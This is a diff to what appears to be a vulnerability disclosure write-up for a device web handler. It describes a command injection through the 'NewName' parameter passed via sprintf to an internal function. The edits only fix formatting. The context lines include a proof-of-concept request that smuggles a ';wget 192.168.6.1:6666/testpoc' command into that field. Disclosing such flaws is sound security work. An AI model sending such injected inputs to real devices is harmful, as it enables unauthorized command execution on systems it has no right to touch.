@@ -21,7 +21,7 @@ When the value of `page` is `SetName`, the function sub_403280 will be called.
 
 <div  align="center"><img src="./img/ftext.png" style="zoom:80%;" /></div>
 
-the value of the `NewName` is inserted into `v11`  using `sprintf`,and the value of `v11 will be handled by the function sub_404850.
+the value of the `NewName` is inserted into `v11`  using `sprintf`,and the value of `v11` will be handled by the function sub_404850.
 
 <div  align="center"><img src="./img/sub_403280.png" style="zoom:80%;" /></div>
 
@@ -52,4 +52,5 @@ page=SetName&macname=&flag=&NewName=;wget 192.168.6.1:6666/testpoc
 ```
 
 <div  align="center"><img src="./img/poc.png" style="zoom:80%;" /></div>
+
 
